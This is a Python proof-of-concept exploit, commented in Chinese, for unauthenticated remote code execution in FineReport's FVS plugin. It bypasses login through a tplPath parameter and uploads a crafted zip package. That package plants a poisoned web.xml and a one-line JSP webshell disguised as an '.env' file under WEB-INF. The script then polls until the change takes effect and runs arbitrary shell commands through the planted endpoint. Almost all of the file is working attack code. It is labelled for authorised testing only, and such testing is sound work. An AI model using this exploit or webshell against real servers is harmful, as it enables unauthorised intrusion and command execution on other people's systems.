#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
FineReport FVS 插件未授权 RCE PoC —— 路线二：附件层 web.xml 投毒（fr-fvs-unauth-rce）
=====================================================================================
配套: poc-h2.py(路线一: H2 数据连接层注入) | 原理见 vulnerability-analysis.md

链路:
  tplPath=reportlets 绕过登录校验
  → 未授权上传复用包 → 未授权 apply
  → 附件层按包内清单 AttachmentLayer.json 写文件（WorkResource 根 = WEB-INF）
     · WEB-INF/web.xml  = 投毒部署描述符（注册 <jsp-file> 指向 WEB-INF/x.env 的 servlet）
     · WEB-INF/x.env    = 96 字节 JSP（.env 后缀过 FileSecurityChecker 白名单）
  → web.xml 变更后的重载（自动 reloadable 环境即刻生效；否则随重启/重部署生效）
  → GET /webroot/xs?c=<命令> → Tomcat Jasper 编译执行 → 命令以应用进程权限运行
  → 输出重定向回 webroot → GET 回读

仅用于授权测试 / 自建靶场。禁止指向生产或他人资产。

用法:
  python3 poc-attach.py -t http://127.0.0.1:18081                 # 默认命令: 落地标记并回读
  python3 poc-attach.py -t http://127.0.0.1:18081 -c "id"
  python3 poc-attach.py -t http://127.0.0.1:18081 --wait 300      # 最长等重载 300 秒
说明: FR 本体无自带 web.xml（servlet 走注解注册），新写入的 web.xml 不含
      metadata-complete，不影响 FR 原有功能。还原 = 删除这两个文件后重启。
"""
import argparse
import http.client
import io
import json
import sys
import time
import urllib.parse
import zipfile

WEBXML = '''<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"
         version="3.1">
  <servlet>
    <servlet-name>xs</servlet-name>
    <jsp-file>/WEB-INF/x.env</jsp-file>
  </servlet>
  <servlet-mapping>
    <servlet-name>xs</servlet-name>
    <url-pattern>/xs</url-pattern>
  </servlet-mapping>
</web-app>
'''
JSP_ENV = ('<%=Runtime.getRuntime().exec(new String[]'
           '{"/bin/sh","-c",request.getParameter("c")}).waitFor()%>')


def build_pack() -> bytes:
    """复用包（zip）。关键结构:
    · 实体 info 文件名必须是 bizEntityInfo.json（小写 b，type 取不匹配值跳过 analyzer）
    · AttachmentLayer.json 的 exportPath 相对 content/biz/attachments/ 目录
    · originPath 相对 WEB-INF（受 FileSecurityChecker 后缀白名单约束: .env/.xml 过, .jsp 拒）"""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("resource/info.xml",
                   '<?xml version="1.0" encoding="UTF-8"?>\n<ITEM>\n<structureVersion>2.0'
                   '</structureVersion>\n<name>apwn</name>\n<entityType>fvs</entityType>'
                   '\n<envVersion>11.0</envVersion>\n</ITEM>\n')
        z.writestr("content/biz/BizLayer.json",
                   '{"entityMappings":[{"uuid":"e1","id":"reportlets/apwn/main.fvs"}],'
                   '"staticInfos":[],"attachInfos":[]}')
        z.writestr("content/biz/e1/bizEntityInfo.json", '{"id":"e1","type":99}')
        z.writestr("content/biz/e1/mainContentFileName.fvs", '{"widgets":[],"version":"1.0"}')
        z.writestr("content/data/DataLayer.json",
                   '{"tableInfos":[],"staticInfos":[],"attachInfos":[]}')
        z.writestr("content/biz/attachments/web.xml", WEBXML)   # → WEB-INF/web.xml
        z.writestr("content/biz/attachments/x.env", JSP_ENV)    # → WEB-INF/x.env
        z.writestr("content/biz/attachments/AttachmentLayer.json", json.dumps({
            "attachInfos": [
                {"exportPath": "web.xml", "originPath": "web.xml"},
                {"exportPath": "x.env", "originPath": "x.env"},
            ],
            "staticInfos": [],
        }))
    return buf.getvalue()


def req(urlp, method="GET", body=None, ctype=None, timeout=60):
    conn = http.client.HTTPConnection(urlp.hostname, urlp.port or 80, timeout=timeout)
    conn.request(method, urlp.path + (("?" + urlp.query) if urlp.query else ""),
                 body=body, headers={"Content-Type": ctype} if ctype else {})
    r = conn.getresponse()
    data = r.read()
    conn.close()
    return r.status, data


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-t", "--target", required=True, help="引擎基址, 如 http://ip:18081")
    ap.add_argument("-c", "--cmd", default=None, help="要执行的命令(默认写标记到 webroot 并回读)")
    ap.add_argument("--wait", type=int, default=180, help="等待 web.xml 重载生效的最长秒数")
    a = ap.parse_args()

    base = a.target.rstrip("/")
    o = urllib.parse.urlsplit(base)
    origin = f"{o.scheme}://{o.netloc}"
    readback = f"{origin}/webroot/attach_poc_readback.txt"
    cmd = a.cmd or (f"(echo PWN-ATTACH-LAYER-RCE; id; hostname; date) > "
                    f"/usr/local/tomcat/webapps/webroot/attach_poc_readback.txt 2>&1")

    # ---- 1) 未授权上传复用包 ----
    props = json.dumps({"name": "apwn", "structureVersion": "2.0", "envVersion": "11.0"})
    qs = ("tplPath=reportlets&resourceType=mfvs&groupPath=%5B%5D&props="
          + urllib.parse.quote(props, safe=""))
    b = "----poc114516"
    body = (f"--{b}\r\n".encode()
            + b'Content-Disposition: form-data; name="file"; filename="p.mfvs"\r\n'
            + b"Content-Type: application/octet-stream\r\n\r\n" + build_pack()
            + f"\r\n--{b}--\r\n".encode())
    st, data = req(urllib.parse.urlsplit(
        f"{base}/webroot/decision/view/duchamp/reuse/item?{qs}"), "POST", body,
        f"multipart/form-data; boundary={b}")
    rid = json.loads(data).get("id", "") if st == 200 else ""
    print(f"[1] upload  -> {st}  id={rid}")
    if not rid:
        print("    上传失败:", data[:200]); sys.exit(1)

    # ---- 2) 未授权 apply：附件层此刻已写入 WEB-INF/web.xml 与 WEB-INF/x.env ----
    q = urllib.parse.urlencode({"tplPath": "reportlets", "id": rid, "path": "apwnout"})
    st2, d2 = req(urllib.parse.urlsplit(
        f"{base}/webroot/decision/view/duchamp/reuse/apply/v2/tpl?{q}"), "POST", b"", timeout=120)
    print(f"[2] apply   -> {st2}  {d2[:110].decode('utf-8', 'replace')}")
    print("    （WEB-INF/web.xml 投毒 + WEB-INF/x.env 已落盘）")

    # ---- 3) 等待重载使 web.xml 生效（reloadable 环境自动; 否则随重启/重部署）----
    print(f"[3] 等待重载生效(最长 {a.wait}s, 每 6s 探测 /xs)...")
    deadline = time.time() + a.wait
    armed = False
    while time.time() < deadline:
        try:
            stp, _ = req(urllib.parse.urlsplit(f"{origin}/webroot/xs?c=echo+ok"), timeout=8)
            if stp == 200:
                armed = True
                print("    /xs 已生效（web.xml 已被容器加载）")
                break
        except Exception:
            pass
        time.sleep(6)
    if not armed:
        print("    超时未生效: 该部署未开 reloadable/未发生重载。")
        print("    web.xml 已投毒——任何一次重启/发版/重部署后本链即武器化。")
        print("    （实验容器可 docker restart <engine> 后重跑本脚本，第 3 步会立即通过）")
        sys.exit(2)

    # ---- 4) 触发命令执行 + 回读 ----
    try:
        st4, d4 = req(urllib.parse.urlsplit(
            f"{origin}/webroot/xs?" + urllib.parse.urlencode({"c": cmd})), timeout=20)
        print(f"[4] trigger -> {st4}  waitFor={d4.decode('utf-8', 'replace').strip()}")
    except Exception as e:
        print(f"[4] trigger -> 异常 {e}")
    if not a.cmd:
        try:
            st5, d5 = req(urllib.parse.urlsplit(readback), timeout=10)
            print(f"[5] readback-> {st5}\n{'-' * 46}\n"
                  f"{d5.decode('utf-8', 'replace').strip()}\n{'-' * 46}")
        except Exception as e:
            print(f"[5] readback-> 异常 {e}")
    print("[*] 完成。")

if __name__ == "__main__":
    main()
